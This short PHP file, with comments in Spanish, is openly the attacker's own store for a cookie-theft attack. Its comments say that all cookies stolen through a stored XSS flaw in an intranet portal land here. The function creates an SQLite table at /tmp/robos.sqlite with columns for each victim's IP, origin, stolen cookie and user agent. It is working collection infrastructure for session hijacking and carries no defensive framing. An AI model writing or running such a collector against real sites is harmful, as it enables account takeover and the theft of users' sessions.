<?php
// Base de datos PROPIA del atacante (distinta de la intranet víctima).
// Aquí caen todas las cookies robadas por el XSS almacenado del portal.
function evil_db() {
    $db = new PDO('sqlite:/tmp/robos.sqlite');
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->exec("CREATE TABLE IF NOT EXISTS capturas (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        fecha TEXT,
        ip_victima TEXT,
        origen TEXT,
        cookie TEXT,
        user_agent TEXT
    );");
    return $db;
}
